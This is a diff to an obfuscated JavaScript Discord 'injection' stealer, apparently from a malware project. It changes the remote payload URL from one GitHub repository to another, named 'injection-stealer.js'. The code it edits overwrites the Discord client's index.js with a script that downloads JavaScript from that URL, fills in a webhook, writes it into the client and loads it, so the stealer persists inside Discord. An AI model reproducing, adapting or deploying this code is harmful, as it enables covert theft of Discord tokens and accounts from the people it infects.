@@ -16,7 +16,7 @@ const config = {
   'embed_name': "Mega Injection",
   'embed_icon': 'https://cdn.discordapp.com/attachments/1055176669138268211/1115770643967909940/night-stalker-richard-ramirez.gif?size=4096'.replace(/ /g, "%20"),
   'embed_color': 0x560ddc,
-  'injection_url': "https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js",
+  'injection_url': "https://raw.githubusercontent.com/M1Z4K3/injection/main/injection-stealer.js",
   'api': "https://discord.com/api/v9/users/@me",
   'nitro': {
     'boost': {
@@ -377,7 +377,7 @@ function updateCheck() {
       'name': "discord",
       'main': 'index.js'
     }, null, 0x4));
-    const _0x3d8786 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x396e9f + "';\nconst bdPath = '" + _0x1e3389 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x2a9f5e, 'app.asar') + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
+    const _0x3d8786 = "const fs = require('fs'), https = require('https');\nconst indexJs = '" + _0x396e9f + "';\nconst bdPath = '" + _0x1e3389 + "';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n        init();\n})\nasync function init() {\n    https.get('" + "https://raw.githubusercontent.com/M1Z4K3/injection/main/injection-stealer.js" + "', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '" + "%WEBHOOK%" + "')\n        res.replace('%WEBHOOK_KEY%', '" + "%WEBHOOK_KEY%" + "')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('" + path.join(_0x2a9f5e, 'app.asar') + "')\nif (fs.existsSync(bdPath)) require(bdPath);";
     fs.writeFileSync(_0x809032, _0x3d8786.replace(/\\/g, "\\\\"));
   }
   if (!fs.existsSync(path.join(__dirname, "initiation"))) {
